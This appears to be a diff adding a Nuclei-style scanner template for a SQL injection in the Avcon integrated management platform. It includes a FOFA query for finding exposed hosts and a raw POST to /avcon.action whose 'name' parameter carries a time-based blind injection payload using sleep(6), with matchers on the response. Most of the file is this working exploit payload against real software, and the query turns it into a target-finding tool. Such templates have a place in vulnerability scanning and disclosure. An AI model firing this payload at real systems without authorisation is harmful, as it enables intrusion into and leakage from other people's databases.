@@ -1,0 +1,29 @@
+id: avcon-platform-sqli
+
+info:
+  name: "Avcon综合管理平台avcon接口name参数SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="AVCON-系统管理平台" || "/avcon.action"
+        该漏洞源于Avcon综合管理平台中avcon接口的name参数未正确过滤用户输入，攻击者可通过构造恶意SQL语句实现注入攻击，导致数据库敏感信息泄露或服务可用性受损。
+  tags: Avcon
+
+http:
+- raw:
+  - |
+    POST /avcon.action HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate, br
+
+    name=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&password=u]H[ww6KrA9F.x-F
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '登录失败'
